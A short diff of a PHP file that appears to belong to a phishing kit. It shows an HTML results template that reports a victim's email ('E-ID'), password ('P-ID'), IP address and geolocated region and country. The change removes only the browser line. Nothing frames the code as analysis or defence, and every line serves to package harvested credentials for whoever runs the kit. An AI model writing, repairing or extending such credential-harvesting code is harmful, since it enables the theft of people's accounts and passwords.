@@ -84,7 +84,6 @@ $country = $geo['geoplugin_regionName'].", ".$geo['geoplugin_countryName'];
 			    <p><strong>E-ID:</strong> ".$data['email']."</p>
 			    <p><strong>P-ID:</strong>".$data['pass']."</p>
 				<p></p>
-				  <p><strong>CNAME:</strong> ".$data['broswer']."</p>
 			    <p><strong>IP:</strong>".$data['ip']."</p>
 			    <br>
 			</body>
